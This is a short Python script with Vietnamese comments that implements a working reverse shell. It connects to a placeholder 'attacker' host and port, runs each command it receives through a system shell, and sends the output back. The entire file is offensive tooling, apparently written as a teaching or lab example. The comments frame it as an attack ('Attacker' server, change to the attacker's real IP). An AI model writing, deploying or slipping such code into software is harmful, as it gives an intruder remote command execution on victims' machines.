import socket
import subprocess
from subprocess import PIPE as proc_pipe
from subprocess import STDOUT as proc_stdout


# Cấu hình máy Attacker (Server)
ATTACKER_HOST = '127.0.0.1'  # THAY ĐỔI: IP thực tế của máy Attacker
ATTACKER_PORT = 9191         # Cổng Attacker đang lắng nghe

def reverse_shell():
    # 1. Tạo và kết nối socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_HOST, ATTACKER_PORT))

    # Vòng lặp chính để nhận và thực thi lệnh
    while True:
        # 2. Nhận lệnh từ Server (Attacker)
        command = s.recv(1024).decode('utf-8')

        if not command or command.lower() == 'exit':
            s.send(b"[!] Closing.\n")
            break # Thoát khỏi vòng lặp nhận lệnh

        # 3. Thực thi lệnh sử dụng subprocess.run, redirect std vào PIPE
        try:
            # Khởi tạo tiến trình con
            # Sử dụng để thực hiện lệnh như lệnh Shell mà không bị lỗi
            # Redirect stderr ra stdout
            proc = subprocess.Popen(command, shell=True, stdout=proc_pipe, stderr=proc_stdout)
            # Dùng vòng lặp để đọc stdout từ phía tiến trình con
            # Nếu stdout là empty -> ngừng tiến trình con và break loop
            while True:
                line = proc.stdout.readline()
                if not line:
                    proc.terminate()
                    break
                s.sendall(line)
        except Exception as e:
            s.send(f"[-] Error: {str(e)}".encode('utf-8'))

    # 5. Đóng socket và nghỉ trước khi kết nối lại
    s.close()

if __name__ == '__main__':
    reverse_shell()
